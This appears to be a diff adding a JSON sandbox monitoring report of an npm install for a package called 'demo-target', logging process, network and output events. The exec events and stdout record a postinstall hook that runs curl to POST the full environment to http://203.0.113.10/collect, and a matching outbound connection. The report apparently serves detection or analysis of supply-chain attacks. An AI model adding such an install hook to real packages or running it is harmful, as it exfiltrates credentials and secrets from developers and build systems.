@@ -1,0 +1,78 @@
+{
+  "job_id": "04c9887a-91af-4566-acdb-9c4585e95ca0",
+  "status": "completed",
+  "exit_code": 0,
+  "duration_s": 7.92,
+  "exec_events": [
+    {
+      "ts": "2026-11-01T14:14:29.739326831Z",
+      "pid": 34611,
+      "ppid": 34587,
+      "binary": "/usr/local/bin/docker-entrypoint.sh",
+      "args": "/usr/local/bin/docker-entrypoint.sh npm install --no-audit --no-fund",
+      "parent_binary": "/usr/bin/containerd-shim-runc-v2",
+      "uid": 10001
+    },
+    {
+      "ts": "2026-11-01T14:14:29.742473272Z",
+      "pid": 34611,
+      "ppid": 34611,
+      "binary": "/usr/local/bin/npm",
+      "args": "node /usr/local/bin/npm install --no-audit --no-fund",
+      "parent_binary": "/usr/local/bin/docker-entrypoint.sh",
+      "uid": 10001
+    },
+    {
+      "ts": "2026-11-01T14:14:29.743228583Z",
+      "pid": 34611,
+      "ppid": 34611,
+      "binary": "/usr/local/bin/node",
+      "args": "/usr/local/bin/npm install --no-audit --no-fund",
+      "parent_binary": "/usr/local/bin/npm",
+      "uid": 10001
+    },
+    {
+      "ts": "2026-11-01T14:14:30.210780453Z",
+      "pid": 34666,
+      "ppid": 34611,
+      "binary": "/usr/bin/sh",
+      "args": "-c \"curl -s -m 5 -X POST --data-binary \"$(env)\" http://203.0.113.10/collect || true\"",
+      "parent_binary": "/usr/local/bin/node",
+      "uid": 10001
+    },
+    {
+      "ts": "2026-11-01T14:14:30.211953663Z",
+      "pid": 34667,
+      "ppid": 34666,
+      "binary": "/usr/bin/env",
+      "args": "",
+      "parent_binary": "/usr/bin/sh",
+      "uid": 10001
+    },
+    {
+      "ts": "2026-11-01T14:14:30.212832187Z",
+      "pid": 34668,
+      "ppid": 34666,
+      "binary": "/usr/bin/curl",
+      "args": "-s -m 5 -X POST --data-binary \"npm_config_user_agent=npm/10.8.2 node/v20.20.2 linux x64 workspaces/false\nNODE_VERSION=20.20.2\nHOSTNAME=aa74fd9f5218\nYARN_VERSION=1.22.22\nnpm_node_execpath=/usr/local/bin/node\nnpm_config_noproxy=\nHOME=/home/runner\nnpm_package_json=/work/package.json\nnpm_config_userconfig=/home/runner/.npmrc\nnpm_config_local_prefix=/work\nCOLOR=0\nnpm_config_audit=\nnpm_config_prefix=/usr/local\nnpm_config_npm_version=10.8.2\nnpm_config_cache=/tmp/.npm\nnpm_config_node_gyp=/usr/local/lib/node_modules/npm/node_modules/node-gyp/bin/node-gyp.js\nPATH=/work/node_modules/.bin:/node_modules/.bin:/usr/local/lib/node_modules/npm/node_modules/@npmcli/run-script/lib/node-gyp-bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nNODE=/usr/local/bin/node\nnpm_package_name=demo-target\nnpm_config_fund=\nnpm_lifecycle_script=curl -s -m 5 -X POST --data-binary \"$(env)\" http://203.0.113.10/collect || true\nnpm_package_version=1.0.0\nnpm_lifecycle_event=postinstall\nnpm_config_update_notifier=false\nnpm_config_globalconfig=/usr/local/etc/npmrc\nnpm_config_init_module=/home/runner/.npm-init.js\nPWD=/work\nnpm_execpath=/usr/local/lib/node_modules/npm/bin/npm-cli.js\nnpm_config_global_prefix=/usr/local\nnpm_command=install\nINIT_CWD=/work\nEDITOR=vi\" http://203.0.113.10/collect",
+      "parent_binary": "/usr/bin/sh",
+      "uid": 10001
+    }
+  ],
+  "connect_events": [
+    {
+      "ts": "2026-11-01T14:14:30.220466170Z",
+      "pid": 34668,
+      "binary": "/usr/bin/curl",
+      "daddr": "203.0.113.10",
+      "dport": 80,
+      "family": "AF_INET",
+      "resolved_domain": null
+    }
+  ],
+  "dns_queries": [],
+  "stdout_tail": "\n> demo-target@1.0.0 postinstall\n> curl -s -m 5 -X POST --data-binary \"$(env)\" http://203.0.113.10/collect || true\n\n\nup to date in 5s\n",
+  "stderr_tail": "",
+  "truncated": false,
+  "error": null
+}
